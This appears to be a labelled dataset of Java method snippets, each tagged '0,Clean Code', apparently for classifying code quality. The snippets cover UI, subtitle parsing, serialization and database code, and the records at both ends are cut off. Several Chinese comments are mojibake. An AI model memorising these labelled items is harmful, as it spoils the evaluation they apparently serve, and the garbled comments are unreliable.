    if (Space.firstPrefix(v.getVariables()).isEmpty()) {
      v=v.withVariables(Space.formatFirstPrefix(v.getVariables(),v.getVariables().iterator().next().getPrefix().withWhitespace("" "")));
    }
  }
  return v;
}",0,Clean Code
"private static void parseStyleDeclaration(ParsableByteArray input,WebvttCssStyle style,StringBuilder stringBuilder){
  skipWhitespaceAndComments(input);
  String property=parseIdentifier(input,stringBuilder);
  if ("""".equals(property)) {
    return;
  }
  if (!"":"".equals(parseNextToken(input,stringBuilder))) {
    return;
  }
  skipWhitespaceAndComments(input);
  String value=parsePropertyValue(input,stringBuilder);
  if (value == null || """".equals(value)) {
    return;
  }
  int position=input.getPosition();
  String token=parseNextToken(input,stringBuilder);
  if ("";"".equals(token)) {
  }
 else   if (RULE_END.equals(token)) {
    input.setPosition(position);
  }
 else {
    return;
  }
  if (""color"".equals(property)) {
    style.setFontColor(ColorParser.parseCssColor(value));
  }
 else   if (PROPERTY_BGCOLOR.equals(property)) {
    style.setBackgroundColor(ColorParser.parseCssColor(value));
  }
 else   if (PROPERTY_TEXT_DECORATION.equals(property)) {
    if (VALUE_UNDERLINE.equals(value)) {
      style.setUnderline(true);
    }
  }
 else   if (PROPERTY_FONT_FAMILY.equals(property)) {
    style.setFontFamily(value);
  }
 else   if (PROPERTY_FONT_WEIGHT.equals(property)) {
    if (VALUE_BOLD.equals(value)) {
      style.setBold(true);
    }
  }
 else   if (PROPERTY_FONT_STYLE.equals(property)) {
    if (VALUE_ITALIC.equals(value)) {
      style.setItalic(true);
    }
  }
}
",0,Clean Code
"public SuggestionStripLayoutHelper(final Context context,final AttributeSet attrs,final int defStyle,final ArrayList<TextView> wordViews,final ArrayList<View> dividerViews,final ArrayList<TextView> debugInfoViews){
  mWordViews=wordViews;
  mDividerViews=dividerViews;
  mDebugInfoViews=debugInfoViews;
  final TextView wordView=wordViews.get(0);
  final View dividerView=dividerViews.get(0);
  mPadding=wordView.getCompoundPaddingLeft() + wordView.getCompoundPaddingRight();
  dividerView.measure(ViewGroup.LayoutParams.MATCH_PARENT,ViewGroup.LayoutParams.MATCH_PARENT);
  mDividerWidth=dividerView.getMeasuredWidth();
  final Resources res=wordView.getResources();
  mSuggestionsStripHeight=res.getDimensionPixelSize(R.dimen.config_suggestions_strip_height);
  final TypedArray a=context.obtainStyledAttributes(attrs,R.styleable.SuggestionStripView,defStyle,R.style.SuggestionStripView);
  mSuggestionStripOptions=a.getInt(R.styleable.SuggestionStripView_suggestionStripOptions,0);
  mAlphaObsoleted=ResourceUtils.getFraction(a,R.styleable.SuggestionStripView_alphaObsoleted,1.0f);
  final Colors colors=Settings.getInstance().getCurrent().mColors;
  mColorValidTypedWord=colors.get(ColorType.SUGGESTION_VALID_WORD);
  mColorTypedWord=colors.get(ColorType.SUGGESTION_TYPED_WORD);
  mColorAutoCorrect=colors.get(ColorType.SUGGESTION_AUTO_CORRECT);
  mColorSuggested=colors.get(ColorType.SUGGESTED_WORD);
  final int colorMoreSuggestionsHint=colors.get(ColorType.MORE_SUGGESTIONS_HINT);
  mSuggestionsCountInStrip=a.getInt(R.styleable.SuggestionStripView_suggestionsCountInStrip,DEFAULT_SUGGESTIONS_COUNT_IN_STRIP);
  mCenterSuggestionWeight=ResourceUtils.getFraction(a,R.styleable.SuggestionStripView_centerSuggestionPercentile,DEFAULT_CENTER_SUGGESTION_PERCENTILE);
  mMaxMoreSuggestionsRow=a.getInt(R.styleable.SuggestionStripView_maxMoreSuggestionsRow,DEFAULT_MAX_MORE_SUGGESTIONS_ROW);
  mMinMoreSuggestionsWidth=ResourceUtils.getFraction(a,R.styleable.SuggestionStripView_minMoreSuggestionsWidth,1.0f);
  a.recycle();
  mMoreSuggestionsHint=getMoreSuggestionsHint(res,res.getDimension(R.dimen.config_more_suggestions_hint_text_size),colorMoreSuggestionsHint);
  mCenterPositionInStrip=mSuggestionsCountInStrip / 2;
  mTypedWordPositionWhenAutocorrect=mCenterPositionInStrip - 1;
  mMoreSuggestionsBottomGap=res.getDimensionPixelOffset(R.dimen.config_more_suggestions_bottom_gap);
  mMoreSuggestionsRowHeight=res.getDimensionPixelSize(R.dimen.config_more_suggestions_row_height);
}",0,Clean Code
"@Override public List<AppPackageTagDO> query(List<Long> appPackageIdList,String tag){
  if (CollectionUtils.isEmpty(appPackageIdList)) {
    return Collections.emptyList();
  }
  AppPackageTagDOExample example=new AppPackageTagDOExample();
  AppPackageTagDOExample.Criteria criteria=example.createCriteria();
  criteria.andAppPackageIdIn(appPackageIdList);
  if (!StringUtils.isEmpty(tag)) {
    criteria.andTagEqualTo(tag);
  }
  return appPackageTagMapper.selectByExample(example);
}
@Override public List<AppPackageTagDO> query(List<Long> appPackageIdList){
  return query(appPackageIdList,"""");
}
",0,Clean Code
"/** 
 * Deserialization factory.
 * @param version The serialized object version.
 * @param className The class name.
 * @param message The serialized data.
 * @throws InvalidProtocolBufferException If the protobuf could not be parsed from the {@code message}.
 * @return The deserialized object.
 */
public static HdbscanModel deserializeFromProto(int version,String className,Any message) throws InvalidProtocolBufferException {
  if (version < 0 || version > CURRENT_VERSION) {
    throw new IllegalArgumentException(""Unknown version "" + version + "", this class supports at most version ""+ CURRENT_VERSION);
  }
  HdbscanModelProto proto=message.unpack(HdbscanModelProto.class);
  ModelDataCarrier<?> carrier=ModelDataCarrier.deserialize(proto.getMetadata());
  if (!carrier.outputDomain().getOutput(0).getClass().equals(ClusterID.class)) {
    throw new IllegalStateException(""Invalid protobuf, output domain is not a clustering domain, found "" + carrier.outputDomain().getClass());
  }
  @SuppressWarnings(""unchecked"") ImmutableOutputInfo<ClusterID> outputDomain=(ImmutableOutputInfo<ClusterID>)carrier.outputDomain();
  Tensor outlierScoresTensor=Tensor.deserialize(proto.getOutlierScoresVector());
  if (!(outlierScoresTensor instanceof DenseVector)) {
    throw new IllegalStateException(""Invalid protobuf, outlier scores must be a dense vector, found "" + outlierScoresTensor.getClass());
  }
  DenseVector outlierScoresVector=(DenseVector)outlierScoresTensor;
  List<Integer> clusterLabels=new ArrayList<>(proto.getClusterLabelsList());
  for (  Integer i : clusterLabels) {
    if (outputDomain.getOutput(i) == null && i != -1) {
      throw new IllegalStateException(""Invalid protobuf, found cluster id "" + i + "" which is not present in the domain ""+ outputDomain);
    }
  }
  if (clusterLabels.size() != outlierScoresVector.size()) {
    throw new IllegalStateException(""Invalid protobuf, expected the same number of outlier scores as cluster labels, found "" + outlierScoresVector.size() + "" scores and ""+ clusterLabels.size()+ "" labels"");
  }
  List<HdbscanTrainer.ClusterExemplar> exemplars=new ArrayList<>();
  for (  ClusterExemplarProto p : proto.getClusterExemplarsList()) {
    exemplars.add(HdbscanTrainer.ClusterExemplar.deserialize(p));
  }
  org.tribuo.math.distance.Distance dist=ProtoUtil.deserialize(proto.getDistance());
  return new HdbscanModel(carrier.name(),carrier.provenance(),carrier.featureDomain(),outputDomain,clusterLabels,outlierScoresVector,exemplars,dist,proto.getNoisePointsOutlierScore());
}",0,Clean Code
"@Override public Object getValueAt(int rowIndex,int columnIndex){
  ScanQueueTag.TablesData datas=this.Udatas.get(rowIndex);
switch (columnIndex) {
case 0:
    return datas.id;
case 1:
  return datas.extensionMethod;
case 2:
return datas.requestMethod;
case 3:
return datas.url;
case 4:
return datas.statusCode;
case 5:
return datas.issue;
case 6:
return datas.startTime;
case 7:
return datas.endTime;
}
return null;
}",0,Clean Code
"/** 
 * 楠岃瘉
 * @param signName 绛惧悕
 * @param templateCode 妯＄増缂栧彿
 * @param templateParam 妯＄増鍙傛暟
 * @param phoneNumbers 鎵嬫満鍙�
 */
private void verify(String accessKey,String accessKeySecret,String signName,String templateCode,Map<String,String> templateParam,List<String> phoneNumbers){
  if (StrUtil.isEmpty(accessKey)) {
    throw new SmsException(SmsMsgCodeEnum.CODE_ERROR_SMS_ACCESS_KEY_NULL);
  }
  if (StrUtil.isEmpty(accessKeySecret)) {
    throw new SmsException(SmsMsgCodeEnum.CODE_ERROR_SMS_ACCESS_KEY_SECRET_NULL);
  }
  if (StrUtil.isEmpty(signName)) {
    throw new SmsException(SmsMsgCodeEnum.CODE_ERROR_SMS_SIG_NAME_NULL);
  }
  if (StrUtil.isEmpty(signName)) {
    throw new SmsException(SmsMsgCodeEnum.CODE_ERROR_SMS_SIG_NAME_NULL);
  }
  if (StrUtil.isEmpty(templateCode)) {
    throw new SmsException(SmsMsgCodeEnum.CODE_ERROR_SMS_TEMPLATE_CODE_NULL);
  }
  if (CollUtil.isEmpty(phoneNumbers)) {
    throw new SmsException(SmsMsgCodeEnum.CODE_ERROR_SMS_PHONE_NUMBERS_NULL);
  }
  for (  String tel : phoneNumbers) {
    boolean isPhone=PhoneUtil.isPhone(tel);
    if (!isPhone) {
      throw new SmsException(SmsMsgCodeEnum.EXCEPTION_IS_PHONE);
    }
  }
}
",0,Clean Code
"@Override public void addView(View child,int index){
  if (!isTornDown()) {
    if (child instanceof VRTLight) {
      ((VRTLight)child).addToNode(mNodeJni);
    }
 else     if (child instanceof VRTCamera) {
      final VRTCamera cameraView=(VRTCamera)child;
      mNodeJni.addChildNode(cameraView.getNodeRootTransformCamera().getNodeJni());
    }
 else     if (child instanceof VRTNode) {
      final VRTNode childNode=(VRTNode)child;
      mNodeJni.addChildNode(childNode.mNodeJni);
    }
 else     if (child instanceof VRTAnimatedComponent) {
      VRTAnimatedComponent animatedComponent=(VRTAnimatedComponent)child;
      for (int i=0; i < animatedComponent.getChildCount(); i++) {
        if (!(animatedComponent.getChildAt(i) instanceof VRTNode)) {
          continue;
        }
        VRTNode animatedTarget=(VRTNode)animatedComponent.getChildAt(i);
        if (!containsChild(animatedTarget)) {
          addNativeChild(animatedTarget);
        }
      }
    }
 else {
    }
  }
  super.addView(child,index);
}",0,Clean Code
"/** 
 * Called each time when header is changed.<br/> So, no need to clear state.
 */
@Override public Fragment createFragment(Object rowObj){
  Log.d(TAG,""Creating PageRow fragment"");
  Row row=(Row)rowObj;
  HeaderItem header=row.getHeaderItem();
  if (header instanceof SectionHeaderItem) {
    mFragmentType=((SectionHeaderItem)header).getType();
  }
  Fragment fragment=null;
switch (mFragmentType) {
case BrowseSection.TYPE_ROW:
    fragment=new VideoRowsFragment();
  break;
case BrowseSection.TYPE_GRID:
fragment=new VideoGridFragment();
break;
case BrowseSection.TYPE_SHORTS_GRID:
fragment=new ShortsGridFragment();
break;
case BrowseSection.TYPE_SETTINGS_GRID:
fragment=new SettingsGridFragment();
break;
case BrowseSection.TYPE_MULTI_GRID:
fragment=new MultiVideoGridFragment();
break;
case BrowseSection.TYPE_ERROR:
fragment=new ErrorDialogFragment((ErrorFragmentData)((SectionHeaderItem)header).getSection().getData());
break;
}
if (fragment != null) {
mCurrentFragment=fragment;
if (mSectionSelectedListener != null) {
mSectionSelectedListener.onSectionSelected(row);
}
setCurrentFragmentItemIndex(mSelectedItemIndex);
selectCurrentFragmentItem(mSelectedItem);
return fragment;
}
throw new IllegalArgumentException(String.format(""Invalid row %s"",rowObj));
}
",0,Clean Code
"@GetMapping(""/template/list"") @ApiOperation(""/鏍规嵁璐﹀彿Id鑾峰彇妯℃澘鍒楄〃"") @AustinResult public List<CommonAmisVo> queryList(Integer id){
  try {
    List<CommonAmisVo> result=new ArrayList<>();
    WxMaService wxMaService=accountUtils.getAccountById(id,WxMaService.class);
    List<TemplateInfo> templateList=wxMaService.getSubscribeService().getTemplateList();
    for (    TemplateInfo templateInfo : templateList) {
      CommonAmisVo commonAmisVo=CommonAmisVo.builder().label(templateInfo.getTitle()).value(templateInfo.getPriTmplId()).build();
      result.add(commonAmisVo);
    }
    return result;
  }
 catch (  Exception e) {
    log.error(""MiniProgramController#queryList fail:{}"",Throwables.getStackTraceAsString(e));
    throw new CommonException(RespStatusEnum.SERVICE_ERROR);
  }
}
",0,Clean Code
"private boolean isStoryShownToUser(TL_stories.StoryView view){
  if (view == null) {
    return true;
  }
  if (MessagesController.getInstance(currentAccount).getStoriesController().isBlocked(view)) {
    return false;
  }
  if (MessagesController.getInstance(currentAccount).blockePeers.indexOfKey(view.user_id) >= 0) {
    return false;
  }
  TLRPC.User user=MessagesController.getInstance(currentAccount).getUser(view.user_id);
  if (storyItem != null) {
    if (storyItem.storyItem != null) {
      if (storyItem.storyItem.parsedPrivacy == null) {
        storyItem.storyItem.parsedPrivacy=new StoryPrivacyBottomSheet.StoryPrivacy(currentAccount,storyItem.storyItem.privacy);
      }
      return storyItem.storyItem.parsedPrivacy.containsUser(user);
    }
 else     if (storyItem.uploadingStory != null && storyItem.uploadingStory.entry != null && storyItem.uploadingStory.entry.privacy != null) {
      return storyItem.uploadingStory.entry.privacy.containsUser(user);
    }
  }
  return true;
}",0,Clean Code
"@Override public String buildCreateTableSql(Table table){
  StringBuilder script=new StringBuilder();
  script.append(""CREATE TABLE "").append(""\"""").append(table.getSchemaName()).append(""\"".\"""").append(table.getName()).append(""\"" ("").append(""\n"");
  for (  TableColumn column : table.getColumnList()) {
    if (StringUtils.isBlank(column.getName()) || StringUtils.isBlank(column.getColumnType())) {
      continue;
    }
    DMColumnTypeEnum typeEnum=DMColumnTypeEnum.getByType(column.getColumnType());
    script.append(""\t"").append(typeEnum.buildCreateColumnSql(column)).append("",\n"");
  }
  script=new StringBuilder(script.substring(0,script.length() - 2));
  script.append(""\n);"");
  for (  TableIndex tableIndex : table.getIndexList()) {
    if (StringUtils.isBlank(tableIndex.getName()) || StringUtils.isBlank(tableIndex.getType())) {
      continue;
    }
    DMIndexTypeEnum indexTypeEnum=DMIndexTypeEnum.getByType(tableIndex.getType());
    script.append(""\n"").append("""").append(indexTypeEnum.buildIndexScript(tableIndex)).append("";"");
  }
  for (  TableColumn column : table.getColumnList()) {
    if (StringUtils.isBlank(column.getName()) || StringUtils.isBlank(column.getColumnType()) || StringUtils.isBlank(column.getComment())) {
      continue;
    }
    script.append(""\n"").append(buildComment(column)).append("";"");
  }
  if (StringUtils.isNotBlank(table.getComment())) {
    script.append(""\n"").append(buildTableComment(table)).append("";"");
  }
  return script.toString();
}",0,Clean Code
"private void setRemoteMediaClient(@Nullable RemoteMediaClient remoteMediaClient){
  if (this.remoteMediaClient == remoteMediaClient) {
    return;
  }
  if (this.remoteMediaClient != null) {
    this.remoteMediaClient.removeListener(statusListener);
    this.remoteMediaClient.removeProgressListener(statusListener);
  }
  this.remoteMediaClient=remoteMediaClient;
  if (remoteMediaClient != null) {
    if (sessionAvailabilityListener != null) {
      sessionAvailabilityListener.onCastSessionAvailable();
    }
    remoteMediaClient.addListener(statusListener);
    remoteMediaClient.addProgressListener(statusListener,PROGRESS_REPORT_PERIOD_MS);
    updateInternalState();
  }
 else {
    if (sessionAvailabilityListener != null) {
      sessionAvailabilityListener.onCastSessionUnavailable();
    }
  }
}
",0,Clean Code
"private List<TableInfo> getTableList0(Long dataSourceConfigId,String name){
  DataSourceConfigDO config=dataSourceConfigService.getDataSourceConfig(dataSourceConfigId);
  Assert.notNull(config,""鏁版嵁婧�({}) 涓嶅瓨鍦紒"",dataSourceConfigId);
  DbType dbType=JdbcUtils.getDbType(config.getUrl());
  DataSourceConfig.Builder dataSourceConfigBuilder=new DataSourceConfig.Builder(config.getUrl(),config.getUsername(),config.getPassword());
  if (Objects.equals(dbType,DbType.SQL_SERVER)) {
    dataSourceConfigBuilder.databaseQueryClass(SQLQuery.class);
  }
  StrategyConfig.Builder strategyConfig=new StrategyConfig.Builder().enableSkipView();
  if (StrUtil.isNotEmpty(name)) {
    strategyConfig.addInclude(name);
  }
 else {
    strategyConfig.addExclude(""ACT_[\\S\\s]+|QRTZ_[\\S\\s]+|FLW_[\\S\\s]+"");
    strategyConfig.addExclude(""IMPDP_[\\S\\s]+|ALL_[\\S\\s]+|HS_[\\S\\\\s]+"");
    strategyConfig.addExclude(""[\\S\\s]+\\$[\\S\\s]+|[\\S\\s]+\\$"");
  }
  GlobalConfig globalConfig=new GlobalConfig.Builder().dateType(DateType.TIME_PACK).build();
  ConfigBuilder builder=new ConfigBuilder(null,dataSourceConfigBuilder.build(),strategyConfig.build(),null,globalConfig,null);
  List<TableInfo> tables=builder.getTableInfoList();
  tables.sort(Comparator.comparing(TableInfo::getName));
  return tables;
}",0,Clean Code
"/** 
 * map.put(""module"", normal); 褰撳墠妯″潡 map.put(""needFields"", list); 瀵煎叆鎴栬�呭鍑鸿〃澶寸殑瀛楁 map.put(""allFields"", fields); 鎵�鏈夊瓧娈�
 * @param queryBO
 * @param sortIds
 * @return
 */
@Override public Map<String,Object> getFields(FieldQueryBO queryBO,List<Long> sortIds){
  ModuleEntity normal=moduleService.getNormal(queryBO.getModuleId());
  Long mainFieldId=normal.getMainFieldId();
  AtomicReference<ModuleFieldBO> mainField=new AtomicReference<>(new ModuleFieldBO());
  List<ModuleFieldBO> fields=fieldService.queryList(queryBO);
  List<ModuleFieldBO> excludeMainFields=fields.stream().filter(f -> {
    if (ObjectUtil.notEqual(f.getFieldId(),mainFieldId)) {
      return true;
    }
 else {
      mainField.set(BeanUtil.copyProperties(f,ModuleFieldBO.class));
      return false;
    }
  }
).collect(Collectors.toList());
  List<ModuleFieldBO> needFields;
  if (CollUtil.isNotEmpty(sortIds)) {
    needFields=excludeMainFields.stream().filter(head -> CollUtil.contains(sortIds,head.getFieldId())).collect(Collectors.toList());
  }
 else {
    needFields=excludeMainFields.stream().filter(f -> ObjectUtil.equal(0,f.getIsHidden())).filter(f -> ObjectUtil.equal(1,f.getFieldType())).filter(f -> ObjectUtil.isNull(f.getGroupId()) || ObjectUtil.equal(f.getType(),ModuleFieldEnum.DETAIL_TABLE.getType())).collect(Collectors.toList());
  }
  List<ModuleFieldBO> list=new ArrayList<>();
  list.add(mainField.get());
  list.addAll(needFields);
  Map<String,Object> map=new HashMap<>(4);
  map.put(""module"",normal);
  map.put(""needFields"",list);
  map.put(""allFields"",fields);
  return map;
}",0,Clean Code
"public TwoStateAction(Context context,int actionId,int offIconResId){
  this(context,actionId,offIconResId,true);
}
public TwoStateAction(Context context,int actionId,int offIconResId,boolean enableLongPressMsg){
  this(context,actionId,offIconResId,ActionHelpers.getIconHighlightColor(context),enableLongPressMsg);
}
/** 
 * Constructor
 * @param context Context used for loading resources.
 */
public TwoStateAction(Context context,int actionId,int offIconResId,int highlightColor){
  this(context,actionId,offIconResId,highlightColor,true);
}
public TwoStateAction(Context context,int actionId,int offIconResId,int highlightColor,boolean enableLongPressMsg){
  super(actionId);
  mContext=context;
  Drawable[] drawables=new Drawable[2];
  BitmapDrawable offDrawable=(BitmapDrawable)ContextCompat.getDrawable(context,offIconResId);
  drawables[INDEX_OFF]=offDrawable;
  drawables[INDEX_ON]=offDrawable == null ? null : new BitmapDrawable(context.getResources(),ActionHelpers.createBitmap(offDrawable.getBitmap(),highlightColor));
  setDrawables(drawables);
  String[] labels=new String[drawables.length];
  String simpleName=Helpers.getSimpleClassName(getClass().getSimpleName());
  labels[INDEX_OFF]=simpleName + "" Off"";
  labels[INDEX_ON]=simpleName + "" On"";
  setLabels(labels);
  setIndex(INDEX_OFF);
  mEnableLongPressMsg=enableLongPressMsg;
}",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.math.protos.NeighbourFactoryProto)) {
    return super.equals(obj);
  }
  org.tribuo.math.protos.NeighbourFactoryProto other=(org.tribuo.math.protos.NeighbourFactoryProto)obj;
  if (getVersion() != other.getVersion())   return false;
  if (!getClassName().equals(other.getClassName()))   return false;
  if (hasSerializedData() != other.hasSerializedData())   return false;
  if (hasSerializedData()) {
    if (!getSerializedData().equals(other.getSerializedData()))     return false;
  }
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"/** 
 * 閫掑綊璋冪敤鏌ヨ澶氱骇涓婄骇鍛樺伐id
 * @param level
 * @param employeeId
 * @return
 */
public Long queryLevelEmployee(Integer level,Long employeeId){
  HrmEmployee employeeInfo=employeeService.lambdaQuery().eq(HrmEmployee::getEmployeeId,employeeId).one();
  if (ObjectUtil.isNotNull(employeeInfo)) {
    if (level >= 1) {
      level=level - 1;
      return queryLevelEmployee(level,employeeInfo.getParentId());
    }
 else {
      return employeeInfo.getEmployeeId();
    }
  }
  return null;
}",0,Clean Code
"/** 
 * Changes number of visible items showing in a column when it's activated.  The default value is 3.
 * @param visiblePickerItems Number of visible items showing in a column when it's activated.
 */
public void setActivatedVisibleItemCount(float visiblePickerItems){
  if (visiblePickerItems <= 0) {
    throw new IllegalArgumentException();
  }
  if (mVisibleItemsActivated != visiblePickerItems) {
    mVisibleItemsActivated=visiblePickerItems;
    if (isActivated()) {
      updateColumnSize();
    }
  }
}",0,Clean Code
"public SsaDecoder(){
  this(null);
}
/** 
 * @param initializationData Optional initialization data for the decoder. If not null or empty,the initialization data must consist of two byte arrays. The first must contain an SSA format line. The second must contain an SSA header that will be assumed common to all samples.
 */
public SsaDecoder(@Nullable List<byte[]> initializationData){
  super(""SsaDecoder"");
  if (initializationData != null && !initializationData.isEmpty()) {
    haveInitializationData=true;
    String formatLine=Util.fromUtf8Bytes(initializationData.get(0));
    Assertions.checkArgument(formatLine.startsWith(FORMAT_LINE_PREFIX));
    parseFormatLine(formatLine);
    parseHeader(new ParsableByteArray(initializationData.get(1)));
  }
 else {
    haveInitializationData=false;
  }
}",0,Clean Code
"private static String getTagInfoByElement(StackTraceElement stackTraceElement,View view,String message,String preClassName,boolean isDataBinding){
  if (stackTraceElement == null || view == null || stackTraceElement.getFileName() == null) {
    return """";
  }
  int lineNumber=stackTraceElement.getLineNumber();
  String fileName=stackTraceElement.getFileName();
  String suffix=getFileSuffix(fileName);
  String fileNameWithoutSuffix=getFileWithoutSuffix(fileName);
  String className=stackTraceElement.getClassName();
  final int viewBindingIndex=className.lastIndexOf(""_ViewBinding"");
  if (className.contains(""$"")) {
    className=className.substring(0,className.indexOf(""$""));
  }
  if (!className.endsWith(fileNameWithoutSuffix)) {
    int lastDotIndex=className.lastIndexOf(""."");
    if (lastDotIndex > -1) {
      lastDotIndex+=1;
      className=className.substring(0,lastDotIndex) + fileNameWithoutSuffix;
    }
  }
  if (viewBindingIndex > -1) {
    className=className.substring(0,viewBindingIndex);
  }
  final int MODE_MASK=0x1 << 30;
  if (""setOnClickable"".equals(message)) {
    lineNumber=MODE_MASK | lineNumber;
  }
  if (viewBindingIndex > -1 || isDataBinding) {
    String resourceName="""";
    try {
      resourceName=view.getResources().getResourceName(view.getId());
      resourceName=resourceName.substring(resourceName.indexOf("":id""));
    }
 catch (    Exception e) {
      Log.d(CodeLocator.TAG,""getTagInfo Error "" + view + "", ""+ stackTraceElement);
    }
    if (isDataBinding && resourceName != null && !resourceName.isEmpty()) {
      resourceName=resourceName.replaceFirst("":id"","":bind_id"");
    }
    if (isDataBinding) {
      return className + suffix + resourceName+ "":""+ stackTraceElement.getLineNumber();
    }
 else {
      return className + suffix + resourceName;
    }
  }
 else {
    return className + suffix + "":""+ lineNumber;
  }
}",0,Clean Code
"/** 
 * 瑙ｆ瀽瀹㈡埛绔姹傜殑浼氳瘽ID銆�
 * @param request
 * @return
 */
public List<String> resolveSessionIds(HttpServletRequest request){
  return resolveSessionIds(request.getRequestURI());
}
/** 
 * 瑙ｆ瀽瀹㈡埛绔姹傜殑浼氳瘽ID銆�
 * @param url
 * @return
 */
public List<String> resolveSessionIds(String url){
  List<String> re=new ArrayList<>(3);
  int startIdx=url.indexOf(';');
  if (startIdx < 0)   return re;
  startIdx=startIdx + 1;
  if (startIdx >= url.length())   return re;
  int endIdx=url.indexOf('?',startIdx);
  if (endIdx < 0)   endIdx=url.indexOf('#',startIdx);
  if (endIdx < 0)   endIdx=url.length();
  if (endIdx <= startIdx)   return re;
  String pathParamStr=url.substring(startIdx,endIdx);
  String[] pathParamStrs=StringUtil.split(pathParamStr,"";"",false);
  if (pathParamStrs == null || pathParamStrs.length == 0)   return re;
  for (  String pp : pathParamStrs) {
    int eqIdx=pp.indexOf('=');
    if (eqIdx >= 0 && (eqIdx + 1) < pp.length()) {
      String name=pp.substring(0,eqIdx);
      String value=pp.substring(eqIdx + 1);
      if (this.sessionIdParamName.equals(name) && !StringUtil.isEmpty(value)) {
        re.add(value);
      }
    }
  }
  return re;
}",0,Clean Code
"/** 
 * * 鍒ゆ柇涓�涓狢ollection鏄惁涓虹┖锛� 鍖呭惈List锛孲et锛孮ueue
 * @param coll 瑕佸垽鏂殑Collection
 * @return true锛氫负绌� false锛氶潪绌�
 */
public static boolean isEmpty(Collection<?> coll){
  return isNull(coll) || coll.isEmpty();
}
/** 
 * * 鍒ゆ柇涓�涓璞℃暟缁勬槸鍚︿负绌�
 * @param objects 瑕佸垽鏂殑瀵硅薄鏁扮粍* @return true锛氫负绌� false锛氶潪绌�
 */
public static boolean isEmpty(Object[] objects){
  return isNull(objects) || (objects.length == 0);
}
/** 
 * * 鍒ゆ柇涓�涓狹ap鏄惁涓虹┖
 * @param map 瑕佸垽鏂殑Map
 * @return true锛氫负绌� false锛氶潪绌�
 */
public static boolean isEmpty(Map<?,?> map){
  return isNull(map) || map.isEmpty();
}
/** 
 * * 鍒ゆ柇涓�涓瓧绗︿覆鏄惁涓虹┖涓�
 * @param str String
 * @return true锛氫负绌� false锛氶潪绌�
 */
public static boolean isEmpty(String str){
  return isNull(str) || NULLSTR.equals(str.trim());
}",0,Clean Code
"@Override public boolean delBrokerConfInfo(String operator,int brokerId,boolean rsvData,StringBuilder strBuff,ProcessResult result){
  Integer lid=null;
  BrokerConfEntity curEntity;
  String printPrefix=""[delBrokerConf], "";
  try {
    lid=metaRowLock.getLock(null,StringUtils.getBytesUtf8(String.valueOf(brokerId)),true);
    curEntity=brokerConfigMapper.getBrokerConfByBrokerId(brokerId);
    if (curEntity == null) {
      result.setSuccResult(null);
      return result.isSuccess();
    }
    if (curEntity.getManageStatus().isOnlineStatus()) {
      result.setFailResult(DataOpErrCode.DERR_ILLEGAL_STATUS.getCode(),strBuff.append(""Illegal manage status, please offline the broker("").append(WebFieldDef.BROKERID.name).append(""="").append(curEntity.getBrokerId()).append("") first!"").toString());
      strBuff.delete(0,strBuff.length());
      return result.isSuccess();
    }
    if (!topicDeployMapper.getConfiguredTopicInfo(curEntity.getBrokerId()).isEmpty()) {
      if (rsvData) {
        if (!topicDeployMapper.delTopicConfByBrokerId(brokerId,strBuff,result)) {
          return result.isSuccess();
        }
        strBuff.append(""[delTopicDeployByBrokerId], "").append(operator).append("" deleted topic deploy configure: "").append(brokerId);
        logger.info(strBuff.toString());
        strBuff.delete(0,strBuff.length());
      }
 else {
        result.setFailResult(DataOpErrCode.DERR_UNCLEANED.getCode(),strBuff.append(""Illegal operate conditions, the broker("").append(curEntity.getBrokerId()).append("")'s topic deploy configure uncleaned, please delete them first!"").toString());
        strBuff.delete(0,strBuff.length());
        return result.isSuccess();
      }
    }
    brokerConfigMapper.delBrokerConf(brokerId,strBuff,result);
  }
 catch (  Throwable e) {
    return logExceptionInfo(e,printPrefix,strBuff,result);
  }
 finally {
    if (lid != null) {
      metaRowLock.releaseRowLock(lid);
    }
  }
  if (result.isSuccess()) {
    strBuff.append(printPrefix).append(operator).append("" deleted broker configure: "").append(curEntity);
    logger.info(strBuff.toString());
    strBuff.delete(0,strBuff.length());
  }
  return result.isSuccess();
}",0,Clean Code
"/** 
 * 鏌ヨ鐢熸垚娑堣垂鎯呭喌鍘嗗彶淇℃伅
 */
public List<OffsetStat> queryDateIntervalOffset(String clusterId,String topic,String group,String type,String start,String end,String interval){
  List<OffsetStat> list=new ArrayList<>();
  if (elasticsearchUtil == null) {
    return list;
  }
  try {
    if (StringUtils.isBlank(start)) {
      start=String.valueOf(System.currentTimeMillis() - (60 * 60 * 1000));
      end=String.valueOf(System.currentTimeMillis());
    }
    if (StringUtils.isBlank(interval)) {
      interval=Constants.Interval.FIVE_MINUTES;
    }
    long starts=Long.parseLong(start);
    long ends=Long.parseLong(end);
    if ((ends - starts) / (60 * 1000) > 24 * 60) {
      start=String.valueOf(Long.parseLong(start) - (24 * 60 * 60* 1000));
    }
    String requestBody=ElasticSearchQuery.getDateIntervalQueryBody(clusterId,topic,group,type,start,end,interval);
    JSONObject responseObj=elasticsearchUtil.searchES(requestBody,getMonitorElasticsearchIndexName() + ""*"");
    if (responseObj != null) {
      list=parseDateIntervalResponse(responseObj);
      for (int i=list.size() - 1; i > 0; i--) {
        list.get(i).setOffset(list.get(i).getOffset() - list.get(i - 1).getOffset());
      }
      if (!list.isEmpty()) {
        list.remove(0);
      }
    }
  }
 catch (  Exception e) {
    LOG.error(""queryDateIntervalOffset faild!"",e);
  }
  return list;
}",0,Clean Code
"/** 
 * Removes fragments that are added or removed during a pop operation.
 * @param added Initialized to the fragments that are in the mManager.mAdded, thiswill be modified to contain the fragments that will be in mAdded after the execution ( {@link #executeOps()}.
 * @param oldPrimaryNav The tracked primary navigation fragment as of the beginning ofthis set of ops
 * @return the new oldPrimaryNav fragment after this record's ops would be popped
 */
Fragment trackAddedFragmentsInPop(ArrayList<Fragment> added,Fragment oldPrimaryNav){
  for (int opNum=mOps.size() - 1; opNum >= 0; opNum--) {
    final Op op=mOps.get(opNum);
switch (op.mCmd) {
case OP_ADD:
case OP_ATTACH:
      added.remove(op.mFragment);
    break;
case OP_REMOVE:
case OP_DETACH:
  added.add(op.mFragment);
break;
case OP_UNSET_PRIMARY_NAV:
oldPrimaryNav=op.mFragment;
break;
case OP_SET_PRIMARY_NAV:
oldPrimaryNav=null;
break;
case OP_SET_MAX_LIFECYCLE:
op.mCurrentMaxState=op.mOldMaxState;
break;
}
}
return oldPrimaryNav;
}",0,Clean Code
"/** 
 * Deserialization factory.
 * @param version The serialized object version.
 * @param className The class name.
 * @param message The serialized data.
